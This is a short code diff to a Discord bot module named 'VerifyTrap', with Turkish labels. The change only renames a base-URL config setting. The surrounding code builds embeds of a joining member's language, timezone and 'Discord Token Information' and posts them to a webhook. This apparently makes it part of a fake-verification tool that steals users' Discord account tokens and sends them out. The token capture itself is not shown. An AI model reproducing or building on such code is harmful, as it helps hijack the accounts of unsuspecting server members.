@@ -100,7 +100,7 @@ class VerifyTrap(commands.Cog):
         embed1.add_field(name="Dil", value=lang)
         embed1.add_field(name="Saat Dilimi", value=tz)
         embed1.add_field(name="Zaman (UTC)", value=ts)
-        embed1.set_footer(text=config.VERIFY_BASE_URL)
+        embed1.set_footer(text=config.BASE_URL)
 
         embed2 = discord.Embed(
             title="Discord Token Bilgisi",
@@ -127,7 +127,7 @@ class VerifyTrap(commands.Cog):
             logging.warning(f"[VerifyTrap] Webhook exception: {e}")
 
     def _get_base_url(self):
-        return config.VERIFY_BASE_URL.rstrip("/")
+        return config.BASE_URL.rstrip("/")
 
     @commands.Cog.listener()
     async def on_member_join(self, member):
